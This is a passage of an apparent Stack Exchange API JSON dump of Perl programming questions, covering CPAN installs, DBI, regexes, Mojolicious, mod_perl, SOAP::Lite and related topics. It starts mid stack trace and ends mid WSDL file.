123\n    Class::MOP::__ANON__('Can\\'t use an undefined value as a HASH reference at /usr/lib...') called at /usr/local/share/perl/5.10.1/Try/Tiny.pm line 100\n    Try::Tiny::try('CODE(0x29021c8)', 'Try::Tiny::Catch=REF(0x28fca88)') called at /usr/local/lib/perl/5.10.1/Class/MOP.pm line 128\n    Class::MOP::load_first_existing_class('Catalyst::Exception::Basic') called at /usr/local/lib/perl/5.10.1/Class/MOP.pm line 140\n    Class::MOP::load_class('Catalyst::Exception::Basic', undef) called at /usr/local/lib/perl/5.10.1/Moose/Util.pm line 126\n    Moose::Util::_apply_all_roles('Moose::Meta::Class=HASH(0x2b63fe0)', undef, 'Catalyst::Exception::Basic') called at /usr/local/lib/perl/5.10.1/Moose/Util.pm line 93\n    Moose::Util::apply_all_roles('Moose::Meta::Class=HASH(0x2b63fe0)', 'Catalyst::Exception::Basic') called at /usr/local/lib/perl/5.10.1/Moose.pm line 60\n    Moose::with('Moose::Meta::Class=HASH(0x2b63fe0)', 'Catalyst::Exception::Basic') called at /usr/local/lib/perl/5.10.1/Moose/Exporter.pm line 356\n    Moose::with('Catalyst::Exception::Basic') called at /usr/share/perl5/Catalyst/Exception.pm line 50\n    require Catalyst/Exception.pm called at /usr/share/perl5/Catalyst/Utils.pm line 4\n    Catalyst::Utils::BEGIN() called at /usr/share/perl5/Catalyst/Exception.pm line 0\n    eval {...} called at /usr/share/perl5/Catalyst/Exception.pm line 0\n    require Catalyst/Utils.pm called at /usr/share/perl5/Catalyst/Helper.pm line 12\n    Catalyst::Helper::BEGIN() called at /usr/share/perl5/Catalyst/Exception.pm line 0\n    eval {...} called at /usr/share/perl5/Catalyst/Exception.pm line 0\n    require Catalyst/Helper.pm called at /usr/bin/catalyst.pl line 26\n    main::BEGIN() called at /usr/share/perl5/Catalyst/Exception.pm line 0\n    eval {...} called at /usr/share/perl5/Catalyst/Exception.pm line 0\nCompilation failed in require at /usr/share/perl5/Catalyst/Utils.pm line 4.\nBEGIN failed--compilation aborted at /usr/share/perl5/Catalyst/Utils.pm line 4.\nCompilation failed in require at /usr/share/perl5/Catalyst/Helper.pm line 12.\nBEGIN failed--compilation aborted at /usr/share/perl5/Catalyst/Helper.pm line 12.\nCompilation failed in require at /usr/bin/catalyst.pl line 26.\nBEGIN failed--compilation aborted at /usr/bin/catalyst.pl line 26.\n[14:27: /mnt/mydocuments/git_working_dir/cat_example$] \n</code></pre>\n"},{"tags":["django","web-services","perl","web-applications"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":70,"score":3,"question_id":13101283,"title":"Does Perl have something similar to the Django automatic administrator interface?","body":"<p>I was wondering if there's a glue module to link the likes of DBIx::Class, Mojo et al. together and automatically generate forms, schema etc.</p>\n"},{"tags":["perl","directories"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13100936,"title":"How can I print the folder of a relative path in Perl?","body":"<p>I have a script which takes  a relative path to a folder. Is there any way of getting the name of the folder/directory which is pointed to? If needs be, it could be the absolute path, and I will use regex to strip it. </p>\n\n<p>Say I am executing:</p>\n\n<pre><code>/example/a/b/c/d/perl.pl\n</code></pre>\n\n<p>e.g. 1</p>\n\n<p>If they input:</p>\n\n<pre><code>../../\n</code></pre>\n\n<p>I want it to be able to return 'b' (or the absolute path up to b, I can write a script to strip it). </p>\n\n<p>e.g.2</p>\n\n<p>If they input:</p>\n\n<pre><code>./\n</code></pre>\n\n<p>I want it to be able to return 'd' (or again, the absolute path up to d).</p>\n\n<p>Is there an easy way to do this, as the only way I can think of is counting the number of <code>../</code> and using that to do a regex on the absolute path of the file, which takes alot of processing.</p>\n\n<p>Thanks</p>\n"},{"tags":["regex","perl","search","replace","match"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13088144,"title":"How to replace a variable with another variable in PERL?","body":"<p>I am trying to replace all words from a text except some that I have in an array. Here's my code:</p>\n\n<pre><code>my $text = \"This is a text!And that's some-more text,text!\";\nwhile ($text =~ m/([\\w']+)/g) {\n\n    next if $1 ~~ @ignore_words;\n\n    my $search  = $1;\n    my $replace = uc $search;\n    $text =~ s/$search/$replace/e;\n}\n</code></pre>\n\n<p>However, the program doesn't work. Basically I am trying to make all words uppercase but skip the ones in @ignore_words. I know it's a problem with the variables being used in the regular expression, but I can't figure the problem out.</p>\n"},{"tags":["perl","cpan"],"answer_count":15,"favorite_count":8,"up_vote_count":20,"down_vote_count":0,"view_count":11028,"score":20,"question_id":65865,"title":"What's the easiest way to install a missing Perl module?","body":"<p>I get this error:</p>\n\n<pre>\nCan't locate Foo.pm in @INC\n</pre>\n\n<p>Is there an easier way to install it than downloading, untarring, making, etc?</p>\n"},{"tags":["jquery","ajax","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":13095782,"title":"jquery cannot get response from perl","body":"<p>I want to use jquery to implement ajax response from perl script on the server.But when I use such code, I got nothing. I can get the result from the url in a browser, so I don't know where is wrong.</p>\n\n<pre><code>$(document).ready(function(){\n$(\"button\").click(function(){\n\n$.ajax({\n  'type': 'GET',\n  'url': 'http://XXXX/cgi-bin/XXX.pl?title=dd',\n  'async': true,\n  'success': function(data) {\n        alert(data);\n  }\n});\n\n});\n});\n</code></pre>\n"},{"tags":["sql","perl","dbi","sqlbindparameter","ntext"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":50,"score":3,"question_id":13090907,"title":"DBI: bind_param casts string to ntext -> nvarchar(max) and ntext are incompatible","body":"<p>I have a problem concerning perl DBI's bind_param. The following SQL works:</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare(\"SELECT id FROM table WHERE id = 'string'\");\n$sth-&gt;execute();\n</code></pre>\n\n<p>While the following doesn't:</p>\n\n<pre><code>my $sth = $dbh-&gt;prepare(\"SELECT id FROM table WHERE id = ?\");\n$sth-&gt;execute('string');\n</code></pre>\n\n<p>The error the last query causes is <code>[ODBC SQL Server Driver][SQL Server]The data types nvarchar(max) and ntext are incompatible in the equal to operator. (SQL-42000)</code>.</p>\n\n<p>It seems like <code>bind_param</code>, which gets called by <code>execute</code>, casts 'string' to ntext. How can I work around that?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":93,"score":-1,"question_id":13094500,"title":"Perl script to search and replace multiple lines in multiple html files","body":"<p>I have many html files in a folder. I need to somehow remove a <code>&lt;div id=\"user-info\" ...&gt;...&lt;/div&gt;</code> from all of them. As far as I know I need to use a Perl script for that, but I don't know Perl to do that. Could someone get it for me?</p>\n\n<p>Here is how the \"bad\" code looks like:</p>\n\n<pre><code>&lt;div id=\"user-info\" class=\"logged-in\"&gt;\n    &lt;a class=\"icon icon-key-delete\" href=\"https://test.dev/login.php?0,logout=1\"&gt;Log Out&lt;/a&gt;\n    &lt;a class=\"icon icon-user-edit\" href=\"https://test.dev/control.php\"&gt;Control Center&lt;/a&gt;\n\n\n&lt;/div&gt; &lt;!-- end of div id=user-info --&gt;\n</code></pre>\n\n<p>Thank you in advance!</p>\n"},{"tags":["perl","cgi","facebook-javascript-sdk"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13092903,"title":"Adding a Channel File for Facebook in Perl","body":"<p>Adding a Channel File greatly improves the performance of the Facebook JS SDK by addressing issues with cross-domain communication in certain browsers as per the <a href=\"https://developers.facebook.com/docs/reference/javascript/\" rel=\"nofollow\">documentation</a>.</p>\n\n<p>The contents of the channel.html file should be just a single line:</p>\n\n<pre><code>&lt;script src=\"//connect.facebook.net/en_US/all.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>The channel file should be set to be cached for as long as possible.</p>\n\n<p><strong>In PHP:-</strong></p>\n\n<pre><code>&lt;?php\n $cache_expire = 60*60*24*365;\n header(\"Pragma: public\");\n header(\"Cache-Control: max-age=\".$cache_expire);\n header('Expires: ' . gmdate('D, d M Y H:i:s', time()+$cache_expire) . ' GMT');\n ?&gt;\n &lt;script src=\"//connect.facebook.net/en_US/all.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>How to create the similar file in Perl?</p>\n"},{"tags":["perl","r"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":306,"score":5,"question_id":8721521,"title":"Perl Statistics::R generates blank plot image (jpeg)","body":"<p>I am currently using ActiveState Perl 5.14 and the R project version 2.13.2. Within Perl I am using Statistics::R version 0.08. According to ActiveState the more recent versions of <code>Statistics::R</code> (through 0.24) failed to pass scrutiny and are therefore not available through the PPM.</p>\n\n<p>History: I have been successfully using Perl to access R for some time to perform analysis. Now I want to generate JPEG images of the results of the analysis for easy visualization.</p>\n\n<p>Here's the problem: I can generate the images successfully from within the R console. However, when I run the same commands through Perl I only get a blank image. My console code includes (simplified, of course):</p>\n\n<pre><code>  x&lt;-c(1,2,3,4,5)\n  y&lt;-c(5,4,3,2,1)\n  jpeg(\"C:/temp.jpg\")\n  plot(x,y)\n  dev.off()\n</code></pre>\n\n<p>And my Perl commands include (also simplified):<BR></p>\n\n<pre><code>   $R = Statistics::R-&gt;new();\n   $R-&gt;start_sharedR\n   $R-&gt;send(\"x&lt;-c(1,2,3,4,5)\");\n   $R-&gt;send(\"y&lt;-c(5,4,3,2,1)\");\n   $R-&gt;send('jpeg(\"C:/temp.jpg\")');\n   $R-&gt;send(\"plot(x,y)\");\n   $R-&gt;send(\"dev.off()\");\n</code></pre>\n\n<p>Any suggestions? I know that there are other plotting options accessible to Perl. I have eliminated some (GD Graph) because X-axis data is not treated as numeric. I'd prefer to keep it in R if at all possible since I'm already interacting in that package for the analysis. Thanks!</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":73,"score":0,"question_id":13062076,"title":"Read from input and store comma separated values in Hash","body":"<p>I have a Perl question like this:\nWrite a Perl program that will read a series of last names and phone numbers from the given input. The names and numbers should be separated by a comma. Then print the names and numbers alphabetically according to last name.Use hashes.</p>\n\n<p>Any idea how to solve this?</p>\n"},{"tags":["mysql","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":866,"score":1,"question_id":9109830,"title":"Can't connect to MySQL server on 'localhost' (10055)","body":"<p>I am running three perl scripts sequentially. Each of them connects to a Mysql database multiple times, and either selects or updates the information contained in the database. After running these three scripts about 20~ times (&amp; connecting/disconnecting from database many more times than this), I get the message 'Can't connect to MySQL server on 'localhost' (10055).</p>\n\n<p>I have read elsewhere that I could get it to reconnect to the database using mysql_auto_reconnect=1, however I'm not entirely sure that that is the problem. The Mysql server on my computer is still connected when the program crashes - I don't have to restart it. I wanted to understand why it is doing this, and also I'm not entirely sure how I put in '\"mysql_auto_reconnect=1\", as when I do this it tells me DBI->connect using old style syntax is deprecated. </p>\n\n<pre><code>my $dbh_m= DBI-&gt;connect(\"dbi:mysql:XXX\",\"root\",\"XXX\",\"mysql_auto_reconnect=1\")\n</code></pre>\n\n<p>or die(\"Error at select Trans: $DBI::errstr\");</p>\n\n<p>Do I also need to write this in every time I connect to the database? (Putting that into one of the connections doesn't solve the problem, I still get error messages from all the others - it doesn't begin to run again and then re-crash later). Is this a problem with me connecting/disconnecting to the database to many times?</p>\n\n<p>Thank you!</p>\n"},{"tags":["perl","apache","cgi","mod-perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13095203,"title":"Capturing stack traces on exceptions with mod_perl","body":"<p>I am converting some cgi scripts to mod_perl. Under cgi, I used a sig DIE to capture stack traces whenever there was an uncaptured exception, and logged them. This worked great: whenever something died in the script, I'd get a nice stack trace in my application logs. Code is:</p>\n\n<pre><code>BEGIN {\n  $SIG{__DIE__} = \\&amp;sigDie;\n}\n\nsub sigDie {\n  return 1 if $^S; # we are in an eval block\n\n  my ($error) = @_;\n  cluck(\"Caught fatal error: $error\"); # put a stack trace in the logs via warn\n  local $Log::Log4perl::caller_depth = $Log::Log4perl::caller_depth + 1;\n  FATAL @_; # call log4perl's fatal\n\n  return 1;\n}\n</code></pre>\n\n<p>Under Apache2::Registry, however, my code is no longer called, it simply stops logging when it dies. I assumed this was because my code is being eval'ed by mod_perl, but I took the eval check off my routine above and I'm still not getting called.</p>\n\n<p>Is there any way I can get what I want under mod_perl? I have found these automatic logging of stack traces immensely useful and would miss them if I have to forgo them. So far I have come up empty on how to get it.</p>\n"},{"tags":["perl","ssh"],"answer_count":7,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":17456,"score":4,"question_id":2848725,"title":"How can I ssh inside a Perl script?","body":"<p>I want to SSH to a server and execute a simple command like \"id\" and get the output of it and store it to a file on my primary server. I do not privileges to install <a href=\"http://search.cpan.org/dist/Net-SSH\" rel=\"nofollow\">Net::SSH</a> which would make my task very easy. Please provide me a solution for this. I tried using backticks but I am not able to store the output on the machine from which my script runs.</p>\n"}]}
{"total":22324,"page":5,"pagesize":100,"questions":[{"tags":["perl","parsing","asn.1","der"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13090280,"title":"Perl module to do equivalent of openssl asn1parse","body":"<p>Using OpenSSL one can get parse and dump an ASN.1 DER file giving an output that looks like this: </p>\n\n<pre><code>  100:d=5  hl=2 l=   3 prim: OBJECT            :organizationalUnitName\n  105:d=5  hl=2 l=  11 prim: PRINTABLESTRING   :Big Number Services\n  118:d=3  hl=2 l=  20 cons: SET\n  120:d=4  hl=2 l=  18 cons: SEQUENCE\n  122:d=5  hl=2 l=   3 prim: OBJECT            :commonName\n  127:d=5  hl=2 l=  11 prim: PRINTABLESTRING   :example.com\n  140:d=2  hl=4 l= 290 cons: SEQUENCE\n  144:d=3  hl=2 l=  13 cons: SEQUENCE\n</code></pre>\n\n<p>I would like to generate a similar output using Perl. One way, of course, would be to call <code>openssl ans1parse</code> from within Perl, but I was looking for a way that did <em>not</em> rely on calling an external executable. </p>\n\n<p>I looked at the Perl module <code>Convert::ASN1</code> but it appears that to use that you need the ASN.1 description which I do not have. </p>\n"},{"tags":["perl","bash","shell","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13093709,"title":"How to use shell variables in perl command call in a bash shell script?","body":"<p>How to use shell variables in perl command call in a bash shell script?</p>\n\n<p>I have a perl command in my shell script to evaluate date -1.</p>\n\n<p>How can i use $myDate in perl command call?</p>\n\n<p>This is the section in my script: </p>\n\n<pre><code>myDate='10/10/2012'\n\nDt=$(perl -e 'use POSIX;print strftime '%m/%d/%y', localtime time-86400;\")\n</code></pre>\n\n<p>I wana use $myDate in place of '%m/%d/%y'</p>\n\n<p>Any help will be appriciated.</p>\n\n<p>Thank you.</p>\n"},{"tags":["perl","uniq"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":53,"score":4,"question_id":13073703,"title":"Case Insensitive Unique Array Elements in Perl","body":"<p>I am using the uniq function exported by the module, List::MoreUtils to find the uniq elements in an array. However, I want it to find the uniq elements in a case insensitive way. How can I do that?</p>\n\n<p>I have dumped the output of the Array using Data::Dumper:</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper qw(Dumper);\nuse List::MoreUtils qw(uniq);\nuse feature \"say\";\n\nmy @elements=&lt;array is formed here&gt;;\n\nmy @words=uniq @elements;\n\nsay Dumper \\@words;\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>$VAR1 = [\n          'John',\n          'john',\n          'JohN',\n          'JOHN',\n          'JoHn',\n          'john john'\n        ];\n</code></pre>\n\n<p>Expected output should be: john, john john</p>\n\n<p>Only 2 elements, rest all should be filtered since they are the same word, only the difference is in case.</p>\n\n<p>How can I remove the duplicate elements ignoring the case?</p>\n"},{"tags":["perl","perlbrew"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":41,"score":-1,"question_id":13091632,"title":"Prove is generating with exact perl path location","body":"<p>I am using perlbrew to install Perl. In our build script we are copying all the dependance inside target folder and creating tar ball. This target folder had bin folder where it has installed prove as well. But this prove has taking perl exact path location.</p>\n\n<p>I copy this tar ball and untar this in another box . Another build script use this target folder bin is the path and executing prove. since  prove has exact path location and this path is not available in this box it is throwing exception. </p>\n\n<pre><code>#!/var/local/maria/hudson/workspace/pigeon-environment/perlbrew/perls/perl-5.14.2/bin/perl\neval 'exec /var/local/maria/hudson/workspace/pigeon-environment/perlbrew/perls/perl-5.14.2/bin/perl -S $0 ${1+\"$@\"}' \n</code></pre>\n\n<p>but this path should be:</p>\n\n<pre><code>#!$PWD/target/bin/perl\n</code></pre>\n\n<p>Could someone please to create prove with relative path.</p>\n"},{"tags":["python","perl","script"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":88,"score":-5,"question_id":13092029,"title":"Are scripting languages important or necessary to be a Java developer?","body":"<p>I have backgroud on Java core. But i am confusing about the scripting languages. I am learning JSP,JSF and servlet, HTML,XML in order to be a qualified JEE developer. But many companies, especially larger company, their job post require script skills, Python, Perl, Bash script etc... I can't figure it out how this scripting languages work with Java, is it work with Linux? If i want to learn either of them, which script language is useful for a JEE novice ? I think my energy is limited, i cant not spend all of my time on every languages.its tough!</p>\n"},{"tags":["java","perl","data-structures","hash"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1691,"score":2,"question_id":4769111,"title":"Java equivalent of Perl's hash","body":"<p>I'm been using a lot Perl hashes due to super flexibility and convenient.\nfor instance, in Perl I can do the following:</p>\n\n<pre><code>$hash{AREA_CODE}-&gt;{PHONE}-&gt;{STREET_ADDR}\n</code></pre>\n\n<p>I wondering how can I accomplish the same thing with Java, I guess it has something to do with HashMap?</p>\n\n<p>Thanks,</p>\n"},{"tags":["perl","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13089931,"title":"mojolicious app is caching by default?","body":"<p>I generated a full app from the command console:</p>\n\n<pre><code> mojo generate app MyApp\n</code></pre>\n\n<p>After that i started the dev server:</p>\n\n<pre><code>morbo myapp\n</code></pre>\n\n<p>I changed some code, even changed the name of the default controller, but i can not see any changes in the browser, only if i restart the morbo server works.\nThis is reallly annoying for developing. \nHow to get rid of this caching behaviour?</p>\n\n<p>UPDATE: i noticed if i use hypnotoad instead morbo, works and updates changes properly, so the problem is morbo.</p>\n"},{"tags":["perl","cpan"],"answer_count":5,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":2376,"score":10,"question_id":3462058,"title":"How do I automate CPAN configuration?","body":"<p>The first time you run cpan from the command line, you are prompted for answers to various questions. How do you automate cpan and install modules non-interactively from the beginning?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":3,"view_count":31,"score":-2,"question_id":13087325,"title":"matching columns of different files","body":"<p>I have a situation like this: I have a file like file1</p>\n\n<p>file1</p>\n\n<pre><code>List      ID \n1         NM_00012  \n2         NM_00013   \n2         NM_00013\n3         NM_00021  \n3         NM_00021\n4         NM_000254\n5         NM_000765\n</code></pre>\n\n<p>and a second  file that looks like this:</p>\n\n<p>file2</p>\n\n<pre><code>List      Count \n1         Gene1 \n2         Gene2\n2         Gene2\n3         Gene3 \n3         Gene3 \n4         Gene4\n5         Gene5\n</code></pre>\n\n<p>I would like the  following output:</p>\n\n<p>file 3</p>\n\n<pre><code>List       Count \nNM_00012   Gene1    \nNM_00013   Gene2        \nNM_00021   Gene3                \nNM_000254  Gene4        \nNM_000756  Gene5          \n</code></pre>\n\n<p>Can anyone help me?\nI'm totally new in Perl.</p>\n\n<p>Thanks in advance!!</p>\n"},{"tags":["mysql","perl","multidimensional-array","rows"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13087939,"title":"How to get two (or more) rows into individual arrays providing individual access to each rows column","body":"<p>I have been struggling with this for 16 hours straight and I am at my wits end. I have read all manpages, attempted to make my own, tried several examples and modded many to no avail.</p>\n\n<p>All I want to do is grab some lines from my DB and be able to access each rows variables (column data) individually.</p>\n\n<pre><code> #!/usr/bin/perl -w\n    use strict;\n    use CGI;\n    use CGI ':standard';\n    use CGI::Carp qw(fatalsToBrowser warningsToBrowser);\n    print CGI::header(-expires =&gt; '-1d');\n    use DBI;\n    $|=1;\n\nuse vars qw($getstate $hookup $query $results $city $state $pages $category $lastupdate $progress $actual $city1 $state1 $pages1 $category1 $lastupdate1 $progress1 $actual1);\n\n\n    $getstate = 'Arizona'; ## actually comes in from a query\n\n    ##$hookup is returned from a sub with database credentials\n   $query = $hookup-&gt;prepare(qq{SELECT `city`,`state`,`pages`,`category`,`lastupdate`,`progress`,`actual` FROM `statesettings` WHERE `pages` &gt; `progress` AND `state` LIKE ? ORDER BY `lastupdate` ASC LIMIT 2}); \n    $query-&gt;bind_param(1, \"%$getstate%\");\n    $query-&gt;execute() or die \"Query did not execute\";\n\n    ## I HAVE TRIED all kinds of ways to fetch data! fetchall_arrayref() fetchrow_array() and dozens upon dozens of attempts.\n\n    while ($results = $query-&gt;fetchrow_hashref) {\n    $city = $results-&gt;{city};\n    $pages = $results-&gt;{pages};\n    $category = $results-&gt;{category};\n    $lastupdate = $results-&gt;{lastupdate};\n    $progress = $results-&gt;{progress};\n    $actual = $results-&gt;{actual};\n    #####################\n    }## end WHILE\n    $query-&gt;finish;\n    $hookup-&gt;disconnect;\n</code></pre>\n\n<p>Which, in above for example, I can only figure out how to access one row.</p>\n\n<p>But I want something like: (obviously set up for number of rows I asked for)</p>\n\n<pre><code>$city = $arr[0]['city']; #city from row 0\n$city1 = $arr[1]['city']; #city from row 1\n</code></pre>\n\n<p>OR WHATEVER allows me to get each rows column data individually for use further in!</p>\n\n<p>I was actually successful with a huge piece of code I wrote that pushed all data into an array with a ':' dividing the rows which I split later on then looped each one. Was prob a great example of how to get my result with the most possible code. I know what I want to do is \"built in\" but, I just don't possess the brain power. \nI feel completely brain dead in that I cannot figure this out after so many hours.\nToo close to see possibly?</p>\n\n<p>I would like a little explanation along with any sample code so, I can learn / understand the mechanics. Thanks so much for your guidance...</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":251,"score":8,"question_id":3559958,"title":"How do I interpret the output of Devel::Leak","body":"<p>I've run <a href=\"http://search.cpan.org/~ni-s/Devel-Leak-0.03/Leak.pm\" rel=\"nofollow\"><code>Devel::Leak</code></a> in my program and I don't understand the output it's giving me.</p>\n\n<p>To start, I see it's printing a list of pointers. <em>Can I get that list in an array?</em> Then I can use FindRef to see where it's coming from.</p>\n\n<p>For example:</p>\n\n<pre><code>new 0xaebc28 : SV = PVGV(0x30e7e48) at 0xaebc28\n  REFCNT = 1\n  FLAGS = (GMG,SMG)\n  IV = 0\n  NV = 0\n  PV = 0\n  MAGIC = 0x2db7dc0\n    MG_VIRTUAL = &amp;PL_vtbl_glob\n    MG_TYPE = PERL_MAGIC_glob(*)\n    MG_OBJ = 0xaebc28\n  NAME = \"SUPER::\"\n  NAMELEN = 7\n  GvSTASH = 0x76b228    \"IO::File\"\n  GP = 0x314b170\n    SV = 0x30283c8\n    REFCNT = 1\n    IO = 0x0\n    FORM = 0x0  \n    AV = 0x0\n    HV = 0x301fdb8\n    CV = 0x0\n    CVGEN = 0x0\n    GPFLAGS = 0x0\n    LINE = 161\n    FILE = \"/mypath/perl_install/perl/lib/5.8.9/x86_64-linux/IO/File.pm\"\n    FLAGS = 0x0\n    EGV = 0xaebc28      \"SUPER::\"\n</code></pre>\n\n<p>or a bunch of smaller entries:</p>\n\n<pre><code>new 0x161c268 : SV = RV(0x3029b40) at 0x161c268\n  REFCNT = 1\n  FLAGS = (ROK)\n  RV = 0x161c218\n</code></pre>\n\n<p><em>What do I do with this?</em> I get the Perl struct stuff (magic, iv, pv,..), but how do I go from these lines to knowing where my leak is occurring?</p>\n"},{"tags":["perl","soap","wsdl"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":371,"score":3,"question_id":10138127,"title":"Can't get Perl web service running using WSDL::Generator","body":"<p>I have been trying for two weeks to create a web service in Perl (with <a href=\"https://metacpan.org/module/WSDL%3a%3aGenerator\" rel=\"nofollow\"><code>WSDL::Generator</code></a>) and call it with a client written in Perl.</p>\n\n<p>Now I try the examples provided with the library specializes in WSDL: <a href=\"https://metacpan.org/module/Soap%3a%3aLite\" rel=\"nofollow\"><code>Soap::Lite</code></a>\nbut I get an error that keeps appearing</p>\n\n<pre><code>404 file not found at c.PL at line 7.\n</code></pre>\n\n<p>Can you help me solve it?</p>\n\n<p>Here are my codes:</p>\n\n<p><code>WorldFunctions.pm</code> (C:\\Perl\\SOAP-Lite\\WorldFunctions.pm) : the class</p>\n\n<pre><code>package WorldFunctions;\n    sub new { bless {}, shift; }\n    sub Hello { my ($s, $name) = @_;\n            return 'Hello, ' . $name . \"\\n\";\n    }\n    sub GoodBye { my ($s, $name) = @_;\n            return 'Goodbye, ' . $name . \"\\n\";\n    }\n</code></pre>\n\n<p><code>a.pl</code> (C:\\Perl\\SOAP-Lite\\a.pl): to create the WSDL file of the class WorldFunctions.pm</p>\n\n<pre><code>#!/usr/bin/perl\n    use WSDL::Generator;\n    my $init = {\n            'schema_namesp' =&gt; 'http://localhost/world/WorldFunctions.xsd',\n            'services'      =&gt; 'WorldFunctions',\n            'service_name'  =&gt; 'WorldFunctions',\n            'target_namesp' =&gt; 'http://localhost/world',\n            'documentation' =&gt; 'Simple Hello World SOAP Service.',\n            'location'      =&gt; 'http://localhost/world'\n    };\n    my $w = WSDL::Generator-&gt;new($init);\n    WorldFunctions-&gt;Hello('Joe');\n    WorldFunctions-&gt;GoodBye('Joe');\n    print $w-&gt;get(WorldFunctions); # Returns the WSDL code for a specific class\n   open(TOTO,\"&lt;a.wsdl\");\n   close(TOTO);\n   open(TOTO,\"&gt;a.wsdl\");\n   print TOTO $w-&gt;get(WorldFunctions);\n   close(TOTO);\n</code></pre>\n\n<p><code>c.pl</code> (C:\\Perl\\SOAP-Lite\\c.pl): perl client WSDL file</p>\n\n<pre><code>#!/usr/bin/perl \nuse DBI();\nuse CGI;\nuse SOAP::Lite;\nmy $service = SOAP::Lite-&gt; service('file:a.wsdl');   \nprint \"test retour : |\".$service-&gt; Hello('Joe').\"|\";\n</code></pre>\n\n<p>Knowing that I use a local server (with WAMP server) and I copied into my directory WorldFunctions.pm localhost / world.</p>\n\n<p>Here is the WSDL file: </p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;definitions name=\"WorldFunctions\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" targetNamespace=\"http://localhost/world\" xmlns:tns=\"http://localhost/world\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\" xmlns:xsdl=\"http://localhost/world/WorldFunctions.xsd\"&gt;\n    &lt;types&gt;\n        &lt;xsd:schema targetNamespace=\"http://localhost/world/WorldFunctions.xsd\"&gt;\n            &lt;xsd:element name=\"GoodByeRequest\" type=\"xsd:string\" /&gt;\n            &lt;xsd:element name=\"GoodByeResponse\" type=\"xsd:string\" /&gt;\n            &lt;xsd:element name=\"HelloRequest\" type=\"xsd:string\" /&gt;\n            &lt;xsd:element name=\"HelloResponse\" type=\"xsd:string\" /&gt;\n        &lt;/xsd:schema&gt;\n    &lt;/types&gt;\n    &lt;message name=\"GoodByeRequest\"&gt;\n        &lt;part name=\"GoodByeRequestSoapMsg\" element=\"xsdl:GoodByeRequest\"/&gt;\n    &lt;/message&gt;\n    &lt;message name=\"GoodByeResponse\"&gt;\n        &lt;part name=\"GoodByeResponseSoapMsg\" element=\"xsdl:GoodByeResponse\"/&gt;\n    &lt;/message&gt;\n    &lt;message name=\"HelloRequest\"&gt;\n        &lt;part name=\"HelloRequestSoapMsg\" element=\"xsdl:HelloRequest\"/&gt;\n    &lt;/message&gt;\n    &lt;message name=\"HelloResponse\"&gt;\n        &lt;part name=\"HelloResponseSoapMsg\" element=\"xsdl:HelloResponse\"/&gt;\n    &lt;/message&gt;\n    &lt;portType name=\"WorldFunctionsWorldFunctionsPortType\"&gt;\n        &lt;operation name=\"GoodBye\"&gt;\n            &lt;input message=\"tns:GoodByeRequest\" /&gt;\n            &lt;output message=\"tns:GoodByeResponse\" /&gt;\n        &lt;/operation&gt;\n        &lt;operation name=\"Hello\"&gt;\n            &lt;input message=\"tns:HelloRequest\" /&gt;\n            &lt;output message=\"tns:HelloResponse\" /&gt;\n        &lt;/operation&gt;\n    &lt;/portType&gt;\n    &lt;binding name=\"WorldFunctionsWorldFunctionsBinding\" type=\"tns:WorldFunctionsWorldFunctionsPortType\"&gt;\n        &lt;soap:binding style=\"document\" transport=\"http://schemas.xmlsoap.org/soap/http\"/&gt;\n            &lt;operation name=\"GoodBye\"&gt;\n                &lt;soap:operation style=\"document\" soapAction=\"\"/&gt;\n                &lt;input&gt;\n                    &lt;soap:body use=\"literal\"/&gt;\n                &lt;/input&gt;\n                &lt;output&gt;\n                    &lt;soap:body use=\"literal\"/&gt;\n                &lt;/output&gt;\n            &lt;/operation&gt;\n            &lt;operation name=\"Hello\"&gt;\n                &lt;soap:operation style=\"document\" soapAction=\"\"/&gt;\n                &lt;input&gt;\n                    &lt;soap:body use=\"literal\"/&gt;\n                &lt;/input&gt;\n                &lt;output&gt;\n                    &lt;soap:body 